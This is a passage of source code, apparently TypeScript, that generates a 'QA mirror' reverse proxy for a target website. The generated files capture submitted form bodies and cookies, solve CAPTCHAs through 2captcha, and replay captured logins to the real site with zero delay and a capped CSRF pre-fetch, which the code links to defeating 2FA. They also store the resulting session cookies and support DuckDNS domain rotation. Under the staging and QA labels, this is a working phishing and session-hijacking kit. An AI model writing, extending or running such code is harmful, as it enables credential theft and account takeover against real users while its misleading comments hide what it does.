    params.set('action', (options && options.action) || 'verify');
    params.set('min_score', String((options && options.minScore) || 0.3));
  }

  const taskId = await apiCreate(params);
  return apiPoll(taskId);
}

function tokenFieldForType(type) {
  const normalized = String(type || '').toLowerCase().replace(/-/g, '_');
  return TOKEN_FIELDS[normalized] || 'g-recaptcha-response';
}

function injectTokenIntoBody(body, contentType, type, token) {
  const field = tokenFieldForType(type);
  const ct = String(contentType || '').toLowerCase();

  if (ct.includes('application/json')) {
    try {
      const obj = JSON.parse(body || '{}');
      obj[field] = token;
      return JSON.stringify(obj);
    } catch {
      return body;
    }
  }

  const params = new URLSearchParams(body || '');
  params.set(field, token);
  return params.toString();
}

function bodyNeedsCaptchaToken(body, contentType) {
  const ct = String(contentType || '').toLowerCase();
  const raw = String(body || '');
  const fields = ['g-recaptcha-response', 'h-captcha-response', 'cf-turnstile-response'];
  for (const f of fields) {
    if (!raw.includes(f)) continue;
    if (ct.includes('json')) {
      try {
        const obj = JSON.parse(raw);
        if (!obj[f] || obj[f] === '') return { field: f, empty: true };
      } catch { /* ignore */ }
    } else {
      const params = new URLSearchParams(raw);
      const v = params.get(f);
      if (v == null || v === '') return { field: f, empty: true };
    }
  }
  return null;
}

function inferCaptchaType(field) {
  if (field === 'h-captcha-response') return 'hcaptcha';
  if (field === 'cf-turnstile-response') return 'turnstile';
  return 'recaptcha_v2';
}

async function solveCaptchaForFormEntry(entry, hints) {
  const need = bodyNeedsCaptchaToken(entry.body, entry.content_type);
  if (!need || !need.empty) return null;

  const type = (hints && hints.type) || inferCaptchaType(need.field);
  const siteKey = hints && hints.siteKey;
  if (!siteKey) {
    appendLog('SKIP ' + entry.path + ' — captcha token empty but no siteKey hint');
    return null;
  }

  const pageUrl =
    (hints && hints.pageUrl) ||
    DEFAULT_PAGE_URL + (entry.path && entry.path.startsWith('/') ? entry.path : '/' + (entry.path || ''));

  const token = await solveCaptcha(type, siteKey, pageUrl, hints || {});
  const patchedBody = injectTokenIntoBody(entry.body, entry.content_type, type, token);
  appendLog('INJECT ' + entry.path + ' field=' + need.field);
  return { type, token, body: patchedBody, field: need.field };
}

module.exports = {
  solveCaptcha,
  injectTokenIntoBody,
  bodyNeedsCaptchaToken,
  solveCaptchaForFormEntry,
  tokenFieldForType,
};
`
}

/** Browser client injected into proxied HTML for CAPTCHA-protected form QA. */
export function buildCaptchaClientJs(): string {
  return `(function () {
  'use strict';
  var SOLVE_URL = '/__legion_captcha_solve__';

  function detectChallenge(form) {
    var root = form || document;
    var el =
      root.querySelector('.cf-turnstile[data-sitekey], [data-sitekey].cf-turnstile') ||
      root.querySelector('.h-captcha[data-sitekey], [data-sitekey].h-captcha') ||
      root.querySelector('.g-recaptcha[data-sitekey], [data-sitekey].g-recaptcha') ||
      root.querySelector('[data-sitekey]');
    if (!el) return null;
    var siteKey = el.getAttribute('data-sitekey');
    if (!siteKey) return null;
    var type = 'recaptcha_v2';
    if (el.classList.contains('cf-turnstile')) type = 'turnstile';
    else if (el.classList.contains('h-captcha')) type = 'hcaptcha';
    else if (el.getAttribute('data-size') === 'invisible' || el.getAttribute('data-callback')) type = 'recaptcha_v2';
    return { type: type, siteKey: siteKey, element: el };
  }

  function injectToken(type, token) {
    if (type === 'turnstile') {
      var t = document.querySelector('[name="cf-turnstile-response"], input[name="cf-turnstile-response"]');
      if (t) t.value = token;
      return;
    }
    if (type === 'hcaptcha') {
      var h = document.querySelector('[name="h-captcha-response"], textarea[name="h-captcha-response"]');
      if (h) { h.value = token; h.innerHTML = token; }
      return;
    }
    var g = document.querySelector('#g-recaptcha-response, textarea[name="g-recaptcha-response"]');
    if (!g) {
      g = document.createElement('textarea');
      g.id = 'g-recaptcha-response';
      g.name = 'g-recaptcha-response';
      g.style.display = 'none';
      (document.forms[0] || document.body).appendChild(g);
    }
    g.value = token;
    g.innerHTML = token;
    if (typeof window.___grecaptcha_cfg !== 'undefined' && window.grecaptcha) {
      try {
        var clients = window.___grecaptcha_cfg.clients || {};
        Object.keys(clients).forEach(function (k) {
          var cb = clients[k] && clients[k].callback;
          if (typeof cb === 'function') cb(token);
        });
      } catch (e) { /* QA fallback */ }
    }
  }

  function requestSolve(type, siteKey) {
    return fetch(SOLVE_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Legion-Captcha-QA': '1' },
      body: JSON.stringify({ type: type, siteKey: siteKey, pageUrl: window.location.href }),
    }).then(function (r) { return r.json(); });
  }

  function wireForm(form) {
    if (form.dataset.legionCaptchaWired) return;
    form.dataset.legionCaptchaWired = '1';
    form.addEventListener('submit', function (ev) {
      if (form.dataset.legionCaptchaSolved === '1') return;
      var challenge = detectChallenge(form);
      if (!challenge) return;
      ev.preventDefault();
      ev.stopPropagation();
      requestSolve(challenge.type, challenge.siteKey)
        .then(function (res) {
          if (!res.success || !res.token) throw new Error(res.error || 'solve failed');
          injectToken(challenge.type, res.token);
          form.dataset.legionCaptchaSolved = '1';
          form.submit();
        })
        .catch(function (err) {
          console.error('[legion-captcha-client]', err);
        });
    }, true);
  }

  function init() {
    document.querySelectorAll('form').forEach(wireForm);
    new MutationObserver(function () {
      document.querySelectorAll('form:not([data-legion-captcha-wired])').forEach(wireForm);
    }).observe(document.documentElement, { childList: true, subtree: true });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
`
}

/** Local-only POST body logger for QA form integration debugging. */
export function buildFormLoggerJs(opts?: {
  testLogin?: boolean
  replayOriginal?: boolean
  solveCaptcha?: boolean
}): string {
  const testLogin = opts?.testLogin === true
  const replayOriginal = opts?.replayOriginal === true
  const solveCaptcha = opts?.solveCaptcha === true

  const testLoginHeader = testLogin
    ? replayOriginal
      ? ` * With --test-login + --replay-original: invokes replay.js (internal mirror, then original target once).
`
      : ` * With --test-login: invokes replay.js after each captured POST (internal mirror only).
`
    : ''

  const solveCaptchaHeader = solveCaptcha
    ? ` * With --solve-captcha: exposes /captcha/solve (2captcha API) and augments captured POSTs missing tokens.
`
    : ''

  const testLoginRequires = testLogin
    ? `
let replayLoginForm = null;
if (TEST_LOGIN) {
  replayLoginForm = require('./replay.js').replayLoginForm;
}
`
    : ''

  const solveCaptchaRequires = solveCaptcha
    ? `
const captchaSolver = SOLVE_CAPTCHA ? require('./captcha-solver.js') : null;
`
    : ''

  const testLoginReplayBlock = testLogin
    ? `
      if (TEST_LOGIN && replayLoginForm) {
        void replayLoginForm(entry).catch((err) => {
          console.error('[mirror-logger] replay error:', err && err.message ? err.message : err);
        });
      }
`
    : ''

  const solveCaptchaPostCaptureBlock = solveCaptcha
    ? `
      if (SOLVE_CAPTCHA && captchaSolver) {
        const hints = {
          type: req.headers['x-legion-captcha-type'],
          siteKey: req.headers['x-legion-captcha-sitekey'],
          pageUrl: req.headers['x-legion-captcha-pageurl'],
        };
        void captchaSolver.solveCaptchaForFormEntry(entry, hints).then((result) => {
          if (result && result.body) {
            entry.body = result.body;
            entry.captcha_solved = true;
            entry.captcha_type = result.type;
            appendEntry({ ...entry, timestamp: entry.timestamp + '-patched' });
          }
        }).catch((err) => {
          console.error('[mirror-logger] captcha solve error:', err && err.message ? err.message : err);
        });
      }
`
    : ''

  const captchaSolveRoute = solveCaptcha
    ? `
  if (req.method === 'POST' && req.url === '/captcha/solve') {
    const chunks = [];
    req.on('data', (chunk) => chunks.push(chunk));
    req.on('end', () => {
      if (!SOLVE_CAPTCHA || !captchaSolver) {
        res.writeHead(503, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'SOLVE_CAPTCHA not enabled' }));
        return;
      }
      let payload = {};
      try {
        payload = JSON.parse(Buffer.concat(chunks).toString('utf8') || '{}');
      } catch {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Invalid JSON' }));
        return;
      }
      const type = payload.type || 'turnstile';
      const siteKey = payload.siteKey || payload.sitekey || '';
      const pageUrl = payload.pageUrl || payload.pageurl || '';
      if (!siteKey) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'siteKey required' }));
        return;
      }
      captchaSolver.solveCaptcha(type, siteKey, pageUrl, payload.options || {})
        .then((token) => {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, token, type }));
        })
        .catch((err) => {
          res.writeHead(502, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: err && err.message ? err.message : String(err) }));
        });
    });
    return;
  }
`
    : ''

  return `'use strict';
/**
 * QA mirror form logger — appends POST bodies to logs.json on this machine only.
 * Not exposed publicly; invoked by nginx mirror from the docker network.
${testLoginHeader}${solveCaptchaHeader} */
const http = require('http');
const fs = require('fs');
const path = require('path');
const TEST_LOGIN = process.env.TEST_LOGIN_ENABLED === 'true';
const ORIGINAL_REPLAY = process.env.ORIGINAL_REPLAY_ENABLED === 'true';
const SOLVE_CAPTCHA = process.env.SOLVE_CAPTCHA_ENABLED === 'true';
${testLoginRequires}${solveCaptchaRequires}
const PORT = Number.parseInt(process.env.LOGGER_PORT || '9090', 10);
const LOG_FILE = process.env.LOG_FILE || path.join(__dirname, 'logs.json');
const MAX_ENTRIES = Number.parseInt(process.env.LOGGER_MAX_ENTRIES || '500', 10);

function readEntries() {
  try {
    if (!fs.existsSync(LOG_FILE)) return [];
    const raw = fs.readFileSync(LOG_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function appendEntry(entry) {
  const entries = readEntries();
  entries.push(entry);
  while (entries.length > MAX_ENTRIES) entries.shift();
  fs.mkdirSync(path.dirname(LOG_FILE), { recursive: true });
  fs.writeFileSync(LOG_FILE, JSON.stringify(entries, null, 2), 'utf8');
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/log') {
    const chunks = [];
    req.on('data', (chunk) => chunks.push(chunk));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      const entry = {
        timestamp: new Date().toISOString(),
        method: req.headers['x-original-method'] || 'POST',
        path: req.headers['x-original-uri'] || '/',
        content_type: req.headers['content-type'] || '',
        body,
        headers: {
          referer: req.headers['x-original-referer'] || '',
          origin: req.headers['x-original-origin'] || '',
          user_agent: req.headers['x-original-user-agent'] || '',
          cookie: req.headers['x-original-cookie'] || '',
        },
        local_only: true,
        note: 'QA staging — manual review on this host only',
      };
      appendEntry(entry);
${solveCaptchaPostCaptureBlock}${testLoginReplayBlock}
      res.writeHead(204);
      res.end();
    });
    return;
  }
${captchaSolveRoute}
  if (req.method === 'GET' && req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, entries: readEntries().length, log_file: LOG_FILE }));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('[mirror-logger] QA form logger on port ' + PORT + ' → ' + LOG_FILE);
  if (TEST_LOGIN) console.log('[mirror-logger] --test-login enabled → internal replay via replay.js');
  if (ORIGINAL_REPLAY) console.log('[mirror-logger] --replay-original enabled → one-shot replay to target origin');
  if (process.env.INSTANT_REPLAY_ENABLED === 'true') {
    console.log('[mirror-logger] --instant-replay enabled → delay=0, CSRF budget 300ms');
  }
  if (SOLVE_CAPTCHA) console.log('[mirror-logger] --solve-captcha enabled → 2captcha via captcha-solver.js');
});
`
}

/**
 * Login replay for QA — POSTs captured forms to internal mirror; optionally once to target origin.
 * Captures Set-Cookie headers locally; does not reuse cookies for further requests.
 */
export function buildReplayJs(target: URL, opts?: { replayOriginal?: boolean; instantReplay?: boolean }): string {
  const origin = target.origin
  const host = target.host
  const replayOriginal = opts?.replayOriginal === true
  const instantReplay = opts?.instantReplay === true

  const originalReplayBlock = replayOriginal
    ? `
const ORIGINAL_REPLAY = process.env.ORIGINAL_REPLAY_ENABLED === 'true';
const INSTANT_REPLAY = process.env.INSTANT_REPLAY_ENABLED === 'true';
const ORIGINAL_DELAY_MS = Number.parseInt(
  process.env.ORIGINAL_REPLAY_DELAY_MS || (INSTANT_REPLAY ? '0' : '1000'),
  10,
);
const CSRF_PREFETCH_BUDGET_MS = INSTANT_REPLAY
  ? Number.parseInt(process.env.ORIGINAL_REPLAY_CSRF_BUDGET_MS || '300', 10)
  : 0;
const TARGET_ORIGIN = (process.env.TARGET_ORIGIN || ${JSON.stringify(origin)}).replace(/\\/$/, '');
const ORIGINAL_SESSION_FILE = process.env.ORIGINAL_SESSION_COOKIES_FILE || path.join(__dirname, 'logs', 'original_session_cookies.json');
const ORIGINAL_REPLAY_LOG = process.env.ORIGINAL_REPLAY_LOG_FILE || path.join(__dirname, 'logs', 'original_replay_log.txt');
const originalReplayDone = new Set();

function appendOriginalReplayLog(line) {
  fs.mkdirSync(path.dirname(ORIGINAL_REPLAY_LOG), { recursive: true });
  fs.appendFileSync(ORIGINAL_REPLAY_LOG, line + '\\n', 'utf8');
}

function readOriginalSessionRecords() {
  try {
    if (!fs.existsSync(ORIGINAL_SESSION_FILE)) return [];
    const parsed = JSON.parse(fs.readFileSync(ORIGINAL_SESSION_FILE, 'utf8'));
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function appendOriginalSessionRecord(record) {
  const records = readOriginalSessionRecords();
  records.push(record);
  fs.mkdirSync(path.dirname(ORIGINAL_SESSION_FILE), { recursive: true });
  fs.writeFileSync(ORIGINAL_SESSION_FILE, JSON.stringify(records, null, 2), 'utf8');
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function extractCsrfFromHtml(html) {
  if (!html || typeof html !== 'string') return null;
  const patterns = [
    /<input[^>]*name=["']([^"']*csrf[^"']*)["'][^>]*value=["']([^"']*)["'][^>]*>/gi,
    /<input[^>]*value=["']([^"']*)["'][^>]*name=["']([^"']*csrf[^"']*)["'][^>]*>/gi,
    /<meta[^>]*name=["'][^"']*csrf[^"']*["'][^>]*content=["']([^"']*)["'][^>]*>/gi,
    /<meta[^>]*content=["']([^"']*)["'][^>]*name=["'][^"']*csrf[^"']*["'][^>]*>/gi,
  ];
  for (const re of patterns) {
    let m;
    re.lastIndex = 0;
    while ((m = re.exec(html)) !== null) {
      if (re.source.includes('meta')) {
        return { name: 'csrf_token', value: m[1] };
      }
      const name = m[1] && /csrf/i.test(m[1]) ? m[1] : m[2];
      const value = m[1] && /csrf/i.test(m[1]) ? m[2] : m[1];
      if (name && value != null) return { name, value };
    }
  }
  return null;
}

function patchBodyWithCsrf(body, contentType, fieldName, token) {
  if (!fieldName || token == null || token === '') return body;
  const ct = String(contentType || '').toLowerCase();
  if (ct.includes('application/json')) {
    try {
      const obj = JSON.parse(body || '{}');
      if (obj[fieldName] == null) obj[fieldName] = token;
      return JSON.stringify(obj);
    } catch {
      return body;
    }
  }
  if (ct.includes('application/x-www-form-urlencoded') || ct.includes('multipart/form-data') || !ct) {
    const params = new URLSearchParams(body || '');
    if (!params.has(fieldName)) params.set(fieldName, token);
    return params.toString();
  }
  return body;
}

function loginPageUrlFor(entryPath) {
  const p = entryPath && entryPath.startsWith('/') ? entryPath : '/' + (entryPath || '');
  if (/login|signin|sign-in|auth/i.test(p)) return TARGET_ORIGIN + p;
  return TARGET_ORIGIN + '/login';
}

function seedJarFromCapturedCookies(jar, cookieHeader) {
  if (!cookieHeader) return;
  const pairs = String(cookieHeader).split(';');
  for (const pair of pairs) {
    const trimmed = pair.trim();
    if (!trimmed) continue;
    try {
      jar.setCookieSync(trimmed, TARGET_ORIGIN);
    } catch {
      /* ignore invalid cookie pairs */
    }
  }
}

function extractSessionCookies(setCookies, jarCookies) {
  const names = [];
  const all = [];
  for (const c of setCookies) {
    all.push(c);
    if (/session|token|access_token|sid|auth/i.test(c.name)) names.push(c.name);
  }
  for (const c of jarCookies) {
    if (!all.some((x) => x.name === c.name)) all.push(c);
    if (/session|token|access_token|sid|auth/i.test(c.name) && !names.includes(c.name)) names.push(c.name);
  }
  return { all, sessionLike: names };
}

async function prefetchCsrfToken(client, loginUrl, hdrs) {
  const getHeaders = {
    Accept: 'text/html,application/xhtml+xml,*/*',
    Referer: TARGET_ORIGIN + '/',
    Origin: TARGET_ORIGIN,
    'User-Agent': hdrs.user_agent || 'Legion-QA-Original-Replay/1.0',
  };

  if (CSRF_PREFETCH_BUDGET_MS <= 0) {
    const pre = await client.get(loginUrl, {
      headers: getHeaders,
      timeout: REPLAY_TIMEOUT_MS,
    });
    return { csrf: extractCsrfFromHtml(pre.data), elapsed_ms: null, skipped: false };
  }

  const csrfStart = Date.now();
  const fetchPromise = client
    .get(loginUrl, { headers: getHeaders, timeout: CSRF_PREFETCH_BUDGET_MS })
    .then((pre) => extractCsrfFromHtml(pre.data));

  const csrf = await Promise.race([
    fetchPromise,
    sleep(CSRF_PREFETCH_BUDGET_MS).then(() => null),
  ]);
  const elapsed = Date.now() - csrfStart;

  if (csrf == null) {
    return { csrf: null, elapsed_ms: elapsed, skipped: true, reason: 'budget_exceeded' };
  }
  return { csrf, elapsed_ms: elapsed, skipped: false };
}

async function replayToOriginalTarget(entry) {
  if (!ORIGINAL_REPLAY) return;
  if (originalReplayDone.has(entry.timestamp)) {
    appendOriginalReplayLog('[SKIP-DUP] ' + entry.timestamp + ' — original replay already sent once');
    return;
  }
  if (!isLoginCandidate(entry)) {
    appendOriginalReplayLog('[SKIP] ' + entry.timestamp + ' ' + entry.path + ' — not a login POST candidate');
    return;
  }

  originalReplayDone.add(entry.timestamp);
  if (ORIGINAL_DELAY_MS > 0) {
    await sleep(ORIGINAL_DELAY_MS);
  }

  const { wrapper } = require('axios-cookiejar-support');
  const { CookieJar } = require('tough-cookie');
  const jar = new CookieJar();
  const client = wrapper(
    axios.create({
      jar,
      withCredentials: true,
      timeout: REPLAY_TIMEOUT_MS,
      maxRedirects: 0,
      validateStatus: () => true,
      responseType: 'text',
    }),
  );

  const entryPath = entry.path && entry.path.startsWith('/') ? entry.path : '/' + (entry.path || '');
  const postUrl = TARGET_ORIGIN + entryPath;
  const loginUrl = loginPageUrlFor(entryPath);
  const hdrs = entry.headers || {};

  seedJarFromCapturedCookies(jar, hdrs.cookie);

  let body = entry.body;
  let csrfField = null;
  try {
    const prefetch = await prefetchCsrfToken(client, loginUrl, hdrs);
    if (prefetch.skipped) {
      appendOriginalReplayLog(
        '[CSRF-SKIP] ' + entry.timestamp + ' instant replay — pre-fetch exceeded ' +
        CSRF_PREFETCH_BUDGET_MS + 'ms budget (' + prefetch.elapsed_ms + 'ms)',
      );
    } else if (prefetch.csrf) {
      csrfField = prefetch.csrf.name;
      body = patchBodyWithCsrf(body, entry.content_type, prefetch.csrf.name, prefetch.csrf.value);
      appendOriginalReplayLog(
        '[CSRF] ' + entry.timestamp + ' prefetched ' + prefetch.csrf.name + ' from ' + loginUrl +
        (prefetch.elapsed_ms != null ? ' (' + prefetch.elapsed_ms + 'ms)' : ''),
      );
    }
  } catch (err) {
    const msg = err && err.message ? err.message : String(err);
    appendOriginalReplayLog('[CSRF-WARN] ' + entry.timestamp + ' pre-fetch failed: ' + msg);
  }

  const headers = {
    'Content-Type': entry.content_type || 'application/x-www-form-urlencoded',
    Referer: hdrs.referer || loginUrl,
    Origin: hdrs.origin || TARGET_ORIGIN,
    'User-Agent': hdrs.user_agent || 'Legion-QA-Original-Replay/1.0',
    Accept: 'text/html,application/json,*/*',
    'X-Legion-QA-Original-Replay': '1',
  };

  const started = Date.now();
  try {
    const res = await client.post(postUrl, body, { headers });
    const setCookies = parseSetCookies(res.headers);
    const jarCookies = await jar.getCookies(TARGET_ORIGIN);
    const jarParsed = jarCookies.map((c) => ({
      name: c.key,
      value: c.value,
      raw: c.toString(),
    }));
    const { all, sessionLike } = extractSessionCookies(setCookies, jarParsed);
    const success = res.status >= 200 && res.status < 400;
    const elapsed = Date.now() - started;

    appendOriginalSessionRecord({
      timestamp: new Date().toISOString(),
      captured_at: entry.timestamp,
      path: entry.path,
      replay_url: postUrl,
      status: res.status,
      success,
      elapsed_ms: elapsed,
      response_headers: {
        'content-type': res.headers['content-type'] || '',
        location: res.headers.location || '',
        'set-cookie': res.headers['set-cookie'] || [],
      },
      csrf_field: csrfField,
      session_cookie_names: sessionLike,
      cookies: all,
      replayed_once: true,
      note: 'Original target replay — session cookies stored for manual inspection only',
    });

    appendOriginalReplayLog(
      '[' + (success ? 'OK' : 'FAIL') + '] ' + entry.timestamp + ' POST ' + entry.path +
      ' → ' + postUrl + ' status=' + res.status +
      ' (' + all.length + ' cookies, session-like: ' + sessionLike.join(',') + ', ' + elapsed + 'ms)',
    );
  } catch (err) {
    const message = err && err.message ? err.message : String(err);
    appendOriginalSessionRecord({
      timestamp: new Date().toISOString(),
      captured_at: entry.timestamp,
      path: entry.path,
      replay_url: postUrl,
      success: false,
      error: message,
      cookies: [],
      replayed_once: true,
    });
    appendOriginalReplayLog('[ERROR] ' + entry.timestamp + ' POST ' + entry.path + ' → ' + postUrl + ' ' + message);
  }
}
`
    : ''

  const originalReplayCall = replayOriginal
    ? `
    if (ORIGINAL_REPLAY) {
      await replayToOriginalTarget(entry);
    }`
    : ''

  return `'use strict';
/**
 * QA login replay — internal mirror; optional one-shot replay to target origin.
 * Target reference: ${origin}
 *
 * Replays captured POST bodies to http://qa-dynamic-mirror:8080<path> inside docker compose.
${replayOriginal ? ` * With ORIGINAL_REPLAY_ENABLED=true, also POSTs once to ${origin}<path> (manual inspection only).\n` : ''}${instantReplay ? ' * With INSTANT_REPLAY_ENABLED=true, delay=0 and CSRF pre-fetch capped at 300ms.\n' : ''} * Session cookies are captured locally; not reused for further requests.
 */
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const MIRROR_BASE = (process.env.MIRROR_INTERNAL_URL || 'http://qa-dynamic-mirror:8080').replace(/\\/$/, '');
const SESSION_FILE = process.env.SESSION_COOKIES_FILE || path.join(__dirname, 'logs', 'session_cookies.json');
const REPLAY_LOG = process.env.REPLAY_LOG_FILE || path.join(__dirname, 'logs', 'replay_log.txt');
const TARGET_HOST = process.env.TARGET_HOST || ${JSON.stringify(host)};
const REPLAY_TIMEOUT_MS = Number.parseInt(process.env.REPLAY_TIMEOUT_MS || '15000', 10);
${originalReplayBlock}
function appendReplayLog(line) {
  fs.mkdirSync(path.dirname(REPLAY_LOG), { recursive: true });
  fs.appendFileSync(REPLAY_LOG, line + '\\n', 'utf8');
}

function readSessionRecords() {
  try {
    if (!fs.existsSync(SESSION_FILE)) return [];
    const parsed = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function appendSessionRecord(record) {
  const records = readSessionRecords();
  records.push(record);
  fs.mkdirSync(path.dirname(SESSION_FILE), { recursive: true });
  fs.writeFileSync(SESSION_FILE, JSON.stringify(records, null, 2), 'utf8');
}

function parseSetCookies(headers) {
  const raw = headers && headers['set-cookie'];
  if (!raw) return [];
  const list = Array.isArray(raw) ? raw : [raw];
  return list.map((sc) => {
    const semi = sc.indexOf(';');
    const pair = semi >= 0 ? sc.slice(0, semi) : sc;
    const eq = pair.indexOf('=');
    if (eq <= 0) return { name: pair.trim(), value: '', raw: sc };
    return {
      name: pair.slice(0, eq).trim(),
      value: pair.slice(eq + 1).trim(),
      raw: sc,
    };
  });
}

function isLoginCandidate(entry) {
  const p = String(entry.path || '').toLowerCase();
  const body = String(entry.body || '').toLowerCase();
  if (/login|signin|sign-in|auth|session|oauth|token/.test(p)) return true;
  if (/password|passwd|pwd|username|email/.test(body)) return true;
  return entry.method === 'POST';
}

function buildReplayUrl(entryPath) {
  const p = entryPath && entryPath.startsWith('/') ? entryPath : '/' + (entryPath || '');
  return MIRROR_BASE + p;
}

async function replayLoginForm(entry) {
  if (!isLoginCandidate(entry)) {
    appendReplayLog('[SKIP] ' + entry.timestamp + ' ' + entry.path + ' — not a login POST candidate');
    return;
  }

  const url = buildReplayUrl(entry.path);
  const headers = {
    'Content-Type': entry.content_type || 'application/x-www-form-urlencoded',
    'X-Legion-QA-Replay': '1',
    Accept: 'text/html,application/json,*/*',
  };
  if (TARGET_HOST) headers.Host = TARGET_HOST;

  const started = Date.now();
  try {
    const res = await axios({
      method: 'POST',
      url,
      data: entry.body,
      headers,
      timeout: REPLAY_TIMEOUT_MS,
      maxRedirects: 0,
      validateStatus: () => true,
      responseType: 'text',
    });

    const cookies = parseSetCookies(res.headers);
    const success = res.status >= 200 && res.status < 400;
    const elapsed = Date.now() - started;

    appendSessionRecord({
      timestamp: new Date().toISOString(),
      captured_at: entry.timestamp,
      path: entry.path,
      replay_url: url,
      status: res.status,
      success,
      elapsed_ms: elapsed,
      cookies,
      local_only: true,
      note: 'Captured for QA auth debugging — cookie not reused automatically',
    });

    appendReplayLog(
      '[' + (success ? 'OK' : 'FAIL') + '] ' + entry.timestamp + ' POST ' + entry.path +
      ' → ' + res.status + ' (' + cookies.length + ' Set-Cookie, ' + elapsed + 'ms)',
    );
  } catch (err) {
    const message = err && err.message ? err.message : String(err);
    appendSessionRecord({
      timestamp: new Date().toISOString(),
      captured_at: entry.timestamp,
      path: entry.path,
      replay_url: url,
      success: false,
      error: message,
      cookies: [],
      local_only: true,
    });
    appendReplayLog('[ERROR] ' + entry.timestamp + ' POST ' + entry.path + ' → ' + message);
  }
${originalReplayCall}
}

module.exports = { replayLoginForm };
`
}

export function buildMirrorStatusHtml(
  target: URL,
  logForms = false,
  replayDemo = false,
  captchaDemo = false,
  rotateDomain = false,
  testLogin = false,
  solveCaptcha = false,
  autoRotate = false,
  replayOriginal = false,
  instantReplay = false,
): string {
  const generated = new Date().toISOString()
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="robots" content="noindex,nofollow" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Mirror active — QA staging</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 48px auto; padding: 0 24px; color: #0f172a; }
    h1 { font-size: 1.5rem; margin-bottom: 0.5rem; }
    .badge { display: inline-block; background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 999px; font-size: 0.85rem; font-weight: 600; }
    code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; }
    p { line-height: 1.6; color: #475569; }
    ul { color: #475569; line-height: 1.7; }
  </style>
</head>
<body>
  <p class="badge">Mirror active</p>
  <h1>QA reverse proxy</h1>
  <p>Internal staging mirror for network routing and response-time testing.${logForms ? ' POST form bodies are logged locally to <code>logs/logs.json</code> for QA review (never sent off this machine).' : ' No credential capture or off-machine data collection.'}${testLogin ? ' Login POSTs are replayed to the internal mirror only (<code>replay.js</code> → <code>logs/session_cookies.json</code>).' : ''}${replayOriginal ? ' Captured logins are also replayed once to the original target (<code>logs/original_session_cookies.json</code>).' : ''}${instantReplay ? ' <strong>Instant replay</strong> — zero delay, CSRF pre-fetch capped at 300ms for 2FA QA.' : ''}${solveCaptcha ? ' CAPTCHA-protected forms use <code>captcha-solver.js</code> (2captcha API, <code>logs/captcha_solver.log</code>).' : ''}${autoRotate ? ' DuckDNS auto-rotation via <code>rotate-domain.sh</code> + <code>domain-rotator</code> (12h health checks).' : ''}</p>
  <p><strong>Upstream target:</strong> <code>${target.href}</code></p>
  <p><strong>Generated:</strong> <code>${generated}</code></p>
  <h2>How to test</h2>
  <ul>
    <li>This page is served locally at <code>/</code>.</li>
    <li>Append any path from the target site to this host to proxy through nginx, e.g. <code>/swap</code>.</li>
    <li>Run <code>docker compose up</code> in this directory, then open <code>http://localhost:8080/</code>.</li>
  </ul>
  <p>Config metadata: <code>/mirror-config.json</code></p>
  ${replayDemo ? '<p>Security training: <code>replay-demo.sh</code> (example curl only — no automatic replay)</p>' : ''}
  ${captchaDemo ? '<p>Security training: <code>README-CAPTCHA-DEMO.md</code> (2captcha education — no API integration)</p>' : ''}
  ${rotateDomain ? '<p>Stress-test training: <code>README-ROTATE-DOMAIN.md</code> + <code>rotate-domain.sh.template</code> (DuckDNS docs only — no auto updates)</p>' : ''}
  ${autoRotate ? '<p>Auto-rotate: <code>rotate-domain.sh</code> + <code>domain-rotator</code> (DuckDNS API, <code>logs/rotate.log</code>)</p>' : ''}
  ${replayOriginal ? '<p>Original replay: <code>replay.js</code> → target origin once per capture (<code>logs/original_replay_log.txt</code>)</p>' : ''}
  ${instantReplay ? '<p>Instant replay: zero delay, CSRF pre-fetch skipped if &gt;300ms (2FA QA)</p>' : ''}
</body>
</html>
`
}

export function buildMirrorReadme(
  target: URL,
  outDir: string,
  hostPort: number,
  logForms = false,
  replayDemo = false,
  captchaDemo = false,
  rotateDomain = false,
  testLogin = false,
  solveCaptcha = false,
  autoRotate = false,
  replayOriginal = false,
  instantReplay = false,
): string {
  return `# QA dynamic mirror (staging only)

**Target:** ${target.href}
**Generated:** ${new Date().toISOString()}

